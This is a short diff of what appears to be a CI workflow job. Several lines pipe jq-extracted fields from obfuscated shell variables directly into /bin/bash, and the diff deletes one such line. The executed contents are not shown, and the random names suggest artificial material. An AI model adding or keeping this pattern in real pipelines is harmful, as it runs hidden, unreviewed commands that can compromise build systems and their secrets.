@@ -26,7 +26,6 @@ jobs:
           echo $gv3 | jq -r .hh632 | /bin/bash
           echo $g586 | jq -r .kofdy165 | /bin/bash
           printf '%s' "$gjv14171" | jq -r .vekeo02 | /bin/bash
-          echo $wv64 | jq -r .n3886 | /bin/bash
           printf '%s' "$q992" | jq -r .xwo134 | /bin/bash
           echo $q78939 | jq -r .mmpo97 | /bin/bash
 
